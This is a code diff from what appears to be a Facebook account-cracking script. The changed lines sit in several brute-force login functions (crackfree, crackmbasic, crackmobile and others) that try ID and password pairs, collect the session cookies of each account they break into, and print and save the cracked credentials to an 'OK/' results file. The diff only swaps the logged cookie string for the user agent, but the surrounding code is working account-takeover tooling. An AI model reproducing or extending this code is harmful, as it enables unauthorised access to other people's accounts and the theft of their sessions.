@@ -754,7 +754,7 @@ def crackfree(idf,pwv):
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				kukis = kuki.replace(f'c_user={idf};datr','sb')
 				print(f'\r{x}[{b}âœ“{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{kukis}\n{x}{ua}{N}')
-				open('OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+				open('OK/'+okh,'a').write(idf+'|'+pw+'|'+ua+'\n')
 				cek_apk(kukis)
 				break
 				
@@ -788,7 +788,7 @@ def crackmbasic(idf,pwv):
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				kukis = kuki.replace(f'c_user={idf};datr','sb')
 				print(f'\r{x}[{b}âœ“{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{kukis}\n{x}{ua}{N}')
-				open('OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+				open('OK/'+okh,'a').write(idf+'|'+pw+'|'+ua+'\n')
 				cek_apk(kukis)
 				break
 				
@@ -824,7 +824,7 @@ def crackmbasic1(idf,pwv):
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				kukis = kuki.replace(f'c_user={idf};datr','sb')
 				print(f'\r{x}[{b}âœ“{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{kukis}\n{x}{ua}{N}')
-				open('OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+				open('OK/'+okh,'a').write(idf+'|'+pw+'|'+ua+'\n')
 				cek_apk(kukis)
 				break
 				
@@ -879,7 +879,7 @@ def crackmobile(idf,pwv):
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				kukis = kuki.replace(f'c_user={idf};datr','sb')
 				print(f'\r{x}[{b}âœ“{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{kukis}\n{x}{ua}{N}')
-				open('OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+				open('OK/'+okh,'a').write(idf+'|'+pw+'|'+ua+'\n')
 				cek_apk(kukis)
 				break
 				
@@ -932,7 +932,7 @@ def crackmobile1(idf,pwv):
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				kukis = kuki.replace(f'c_user={idf};datr','sb')
 				print(f'\r{x}[{b}âœ“{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{kukis}\n{x}{ua}{N}')
-				open('OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
+				open('OK/'+okh,'a').write(idf+'|'+pw+'|'+ua+'\n')
 				cek_apk(kukis)
 				break
 				
